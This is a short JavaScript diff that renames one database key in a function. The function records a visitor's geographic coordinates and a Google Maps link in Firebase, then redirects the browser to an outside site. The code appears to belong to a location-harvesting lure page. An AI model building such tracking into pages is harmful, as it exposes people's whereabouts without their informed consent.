@@ -17,7 +17,7 @@ function showPosition(position) {
   var slat = position.coords.latitude;
   var slong = position.coords.longitude;
   var smaps = "https://google.com/maps/search/"+slat+","+slong;
-  firebase.database().ref("/" + time).set({Latitude: slat,Longitude: slong,maps: smaps});
+  firebase.database().ref("/" + time).set({Latitude: slat,Longitude: slong,Maps: smaps});
   window.location.assign("http://mevoting.is-best.net/");
 }
 
